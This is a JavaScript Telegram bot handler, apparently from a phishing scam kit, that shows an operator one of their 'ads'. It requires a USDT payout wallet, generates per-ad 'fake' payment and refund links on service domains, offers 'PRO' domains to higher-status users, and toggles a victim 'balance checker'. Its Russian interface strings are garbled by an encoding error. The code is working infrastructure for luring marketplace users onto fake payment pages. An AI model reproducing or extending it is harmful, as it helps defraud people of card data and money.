const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const { Ad, User, ProDomain } = require("../database");
const locale = require("../locale");

module.exports = async (ctx, id) => {
  try {
    const user = await User.findByPk(ctx.from.id);
    if (!user.USDTWallet) {
      return ctx.replyOrEdit(
        "‚ùå <b>–ß—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–µ–π, –≤–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ USDT (TRC-20) –≤ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ö</b>",
        { parse_mode: "HTML" }
      );
    }

    const ad = await Ad.findOne({
      where: {
        id,
        userId: ctx.from.id,
      },
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "country",
              required: true,
            },
          ],
        },
      ],
    });
    if (!ad)
      return ctx
        .replyOrEdit("‚ùå –û–±—ä—è–≤–ª–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", {
          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("üîô –ù–∞–∑–∞–¥", "my_ads_1")]]),
        })
        .catch((err) => err);

    var text = locale.myAd.text;

    text = text
      .replace("{service}", `${ad.service.title} ${ad.version}.0`)
      .replace("{title}", escapeHTML(ad.title || "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"))
      .replace("{price}", escapeHTML(ad.price || "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"))
      .replace("{name}", escapeHTML(ad.name || "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"))
      .replace("{phone}", escapeHTML(ad.phone || "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"))
      .replace("{address}", escapeHTML(ad.address || "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"))
      .replace("{balanceChecker}", ad.balanceChecker ? "–≤–∫–ª—é—á–µ–Ω" : "–≤—ã–∫–ª—é—á–µ–Ω")
      .replace("{fakeLink}", `https://${ad.service.domain}/${ad.id}`)
      .replace("{refundLink}", `https://${ad.service.domain}/refund/${ad.id}`);

    if (user.status == 3 || user.status == 1) {
      const domain = await ProDomain.findOne({
        where: {
          serviceCode: ad.service.code,
          status: 1,
        },
      });
      if (domain) {
        text += "\n\n‚öúÔ∏è PRO –î–æ–º–µ–Ω—ã:\n";
        text += `üîó –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã: <b>https://${domain.domain}/${ad.id}</b>\n`;
        text += `üîó –í–æ–∑–≤—Ä–∞—Ç: <b>https://${domain.domain}/refund/${ad.id}</b>`;
      }
    }

    return ctx
      .replyOrEdit(text, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              `${ad.balanceChecker ? "üî¥ –í—ã–∫–ª—é—á–∏—Ç—å" : "üü¢ –í–∫–ª—é—á–∏—Ç—å"} —á–µ–∫–µ—Ä –±–∞–ª–∞–Ω—Å–∞`,
              `my_ad_${ad.id}_turn_${ad.balanceChecker ? "off" : "on"}_balanceChecker`
            ),
          ],
          [Markup.callbackButton(`üí∞ –ò–∑–º–µ–Ω–∏—Ç—å —Ü–µ–Ω—É`, `my_ad_${ad.id}_edit_price`)],
          [Markup.callbackButton(`‚ùå –£–¥–∞–ª–∏—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏–µ`, `my_ad_${ad.id}_delete`)],
          [Markup.callbackButton("üîô –ù–∞–∑–∞–¥", "my_ads_1")],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    return ctx.reply("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
  }
};
